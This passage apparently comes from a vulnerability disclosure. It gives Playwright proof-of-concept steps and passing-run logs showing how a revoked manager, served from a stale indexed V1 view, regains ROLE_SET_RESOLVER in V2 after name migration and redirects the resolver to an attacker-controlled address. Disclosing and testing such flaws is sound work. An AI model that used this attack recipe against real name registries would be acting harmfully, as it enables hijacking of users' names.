9. Open the Manager dashboard using the normal connected-wallet Playwright fixture.
10. Start the normal `Upgrade Names` workflow.
11. The name passes migration eligibility.
12. Manager constructs the migration plan and displays the final upgrade confirmation.
13. Confirm the migration using the normal Manager UI and wallet-confirmation flow.
14. Wait for the migration success state.
15. Read the active V2 Registry and verify the name is registered.
16. Read the revoked attacker's V2 role bitmap.
17. Assert that it contains:

```
ROLE_SET_RESOLVER = 1 << 24
```

18. Verify that the attacker address is an EOA with no deployed code.
19. Read the migrated resolver before the attacker mutation and assert that it is not already the attacker address.
20. Submit a V2 `setResolver()` transaction signed by the revoked attacker with:

```
resolver = attacker.address
```

21. Require the transaction receipt to succeed.
22. Read the resolver again and assert that it equals the attacker-controlled EOA.
23. The Playwright test exits successfully.

### Expected output

The relevant excerpt from the validated passing run is:

```
[PoC] strict canonical V1 registration confirmed: poc-stale-manager-1787393586451.eth
[PoC] canonical BaseRegistrar: 0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85
[PoC] canonical V1 Registry: 0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e

[PoC] BaseRegistrar owner: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
[PoC] initial Registry owner: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266

[PoC] strict V2 reservation confirmed: poc-stale-manager-1787393586451.eth

[PoC] victim:   0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
[PoC] attacker: 0x70997970C51812dc3A010C7d01b50e0d17dc79C8

[PoC] historical Registry manager: 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
[PoC] BaseRegistrar registrant remains victim: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266

[PoC] authoritative Registry manager after revocation: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
[PoC] attacker is revoked before migration begins

[PoC] serving stale indexed manager 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 for poc-stale-manager-1787393586451.eth

[PoC] migration completed

[PoC] attacker regained ROLE_SET_RESOLVER after being revoked before migration

[PoC] resolver before attacker mutation: 0x35b6F4FccCf54edc3fF29c2C171CF12e07352AF0

[PoC] attacker V2 setResolver receipt: success (0x45ddee6f04fd7ac90e054afdd2e39e3718800b0ca9f96ba724cb9384405c774e)

[PoC] SUCCESS: revoked attacker changed the migrated V2 resolver to attacker-controlled EOA 0x70997970C51812dc3A010C7d01b50e0d17dc79C8

1 passed (1.6m)
```

### Why the mocked stale response is realistic

The mocked response creates only this condition:

```
authoritative V1 Registry manager = victim
Manager's indexed V1 view         = historical attacker
```

It does not fabricate the authoritative security transitions.

The test performs real:

```
manager assignment
manager revocation
BaseRegistrar ownership validation
V2 reservation
Manager eligibility
migration execution
role assignment
attacker authorization check
attacker setResolver transaction
final resolver read
```

Manager also explicitly permits previously fetched V1-name data to remain fresh for five minutes in:

```
apps/manager/src/features/migration/hooks/useV1Names.ts:17-22
```

The PoC does not depend on asserting that the production indexer always lags for this period.

Instead, it tests the trust boundary Manager must safely handle whenever its V1 view is stale.

The vulnerability is that later preflight and execution checks do not re-bind the manager receiving persistent V2 authority to current authoritative `V1Registry.owner(node)`.

That missing validation is what allows the historical manager value to become live V2 `ROLE_SET_RESOLVER`.
